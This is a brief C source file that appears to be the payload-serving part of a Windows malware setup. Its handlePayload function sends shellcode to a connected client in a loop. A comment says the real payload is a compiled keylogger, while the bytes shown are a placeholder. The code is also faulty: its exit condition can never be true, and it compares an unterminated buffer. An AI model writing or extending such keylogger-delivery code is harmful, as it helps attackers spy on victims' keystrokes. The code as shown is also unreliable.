#include <windows.h>
#include "payload-server.h" 
#include "include/thread-args.h"


int handlePayload(LPVOID args) {
    const char shellcode[] = "\xe8\x92\x41\x01\x00";  // random thing, an actual bytecode of the compiled keylogger is much longer

    ThreadArgs* threadArgs = (ThreadArgs*)args;
    SOCKET acceptSocket = threadArgs->acceptSocket;
    int bytesReceived = 0;
    char buffer[1024];

    while (1) {
        bytesReceived = recv(acceptSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived == SOCKET_ERROR && bytesReceived == 0 && strcmp(buffer, "OK") != 0) {
            break;
        }
        send(acceptSocket, shellcode, sizeof(shellcode), 0);
    }

    return 1;
}
